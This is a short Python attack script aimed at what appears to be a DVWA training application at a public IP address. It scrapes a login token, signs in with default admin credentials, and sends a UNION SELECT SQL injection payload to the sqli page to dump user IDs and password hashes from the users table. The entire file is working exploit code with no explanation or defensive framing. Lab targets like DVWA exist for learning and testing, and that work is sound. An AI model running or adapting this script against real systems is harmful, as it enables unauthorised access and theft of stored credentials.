
import requests
import re
from urllib.parse import quote

session = requests.Session()

# Get fresh token and login
resp = session.get("http://31.97.117.123/login.php")
match = re.search(r"user_token['\"] value=['\"](.*?)['\"]", resp.text)
token = match.group(1) if match else "574fcd28f93f57c93cb554ecaf3ca520"

# Login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

resp = session.post("http://31.97.117.123/login.php", data=login_data)

# Extract all user data with password hashes
# UNION SELECT to get user_id and password (first 2 columns)
payload = "999' UNION SELECT user_id, password FROM users-- -"
resp = session.get(f"http://31.97.117.123/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")

print("Getting user IDs and passwords:")
print(resp.text[2000:4000])

